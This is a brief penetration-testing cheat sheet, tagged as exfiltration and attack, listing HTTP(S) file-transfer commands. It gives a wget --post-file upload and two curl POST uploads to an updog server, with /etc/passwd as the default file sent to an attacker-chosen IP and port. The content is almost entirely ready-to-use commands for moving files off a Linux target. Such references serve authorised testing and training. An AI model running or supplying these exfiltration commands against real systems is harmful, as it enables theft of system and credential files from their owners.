# FileTransfer-HTTP(s)

% file transfer, exfiltration, injecton

#plateform/linux #target/remote  #cat/ATTACK/LISTEN-SERVE 

## wget - upload
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
wget --post-file <file> http://<ip>:port/
```

## curl - upload to updog (http)
For secured by password use http://:<password>@<ip>:<port>/upload
```
curl -XPOST -F "file=@<file|/etc/passwd>;filename=<filename>" -F "path=<path>" http://<ip>:<port|9090>/upload
```

## curl - upload to updog (https)
For secured by password use http://:<password>@<ip>:<port>/upload
```
curl -XPOST -k -F "file=@<file|/etc/passwd>;filename=<filename>" -F "path=<path>" https://<ip>:<port|9090>/upload
```
